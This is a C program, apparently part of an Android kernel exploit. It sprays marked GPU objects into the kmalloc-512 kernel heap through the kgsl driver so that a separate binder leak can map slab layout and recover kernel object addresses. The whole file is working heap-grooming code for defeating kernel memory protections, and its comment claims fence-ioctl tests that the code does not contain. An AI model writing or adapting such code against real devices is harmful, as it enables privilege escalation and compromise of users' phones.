#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

/* Hold N kmalloc-512 kernel objects alive, each carrying a unique 20-byte marker at
 * entry offset +172, so a binder leak that walks the slab page can tell me:
 *   - whether the binder slot's page is shared with kgsl entries (adjacency),
 *   - which objects are free (their first word = SLUB next pointer),
 *   - and therefore the absolute VA of every object in that page.
 * Also exercises the SYNCSOURCE fence ioctls once, to record their errno from shell. */

struct kgsl_gpuobj_alloc {
    uint64_t size, flags, va_len, mmapsize;
    unsigned int id, metadata_len;
    uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC 0xC0300945UL
struct kgsl_syncline_create_fence { unsigned int syncsource_id, count; };

int main(int argc, char **argv)
{
    int n = argc > 1 ? atoi(argv[1]) : 40;
    int secs = argc > 2 ? atoi(argv[2]) : 120;
    char meta[64];
    int kg, i, held = 0;
    unsigned *ids = calloc(n, sizeof *ids);

    setvbuf(stdout, NULL, _IONBF, 0);
    kg = open("/dev/kgsl-3d0", O_RDWR);
    if (kg < 0) { printf("open kgsl: %s\n", strerror(errno)); return 1; }

    for (i = 0; i < n; i++) {
        struct kgsl_gpuobj_alloc a;
        memset(meta, 0, sizeof meta);
        snprintf(meta, sizeof meta, "QMARK%03d_%06x", i, 0xBEEF00 + i);
        memset(&a, 0, sizeof a);
        a.size = 0x1000;
        a.metadata = (uint64_t)(uintptr_t)meta;
        a.metadata_len = 20;
        if (ioctl(kg, IOCTL_KGSL_GPUOBJ_ALLOC, &a) == 0) {
            ids[held++] = a.id;
        } else {
            printf("alloc failed at %d: errno=%d %s\n", i, errno, strerror(errno));
            break;
        }
    }
    printf("holding %d GPUOBJ entries with markers QMARK000..QMARK%03d\n", held, held - 1);
    fflush(stdout);

    sleep(secs);
    (void)ids;
    close(kg);
    return 0;
}
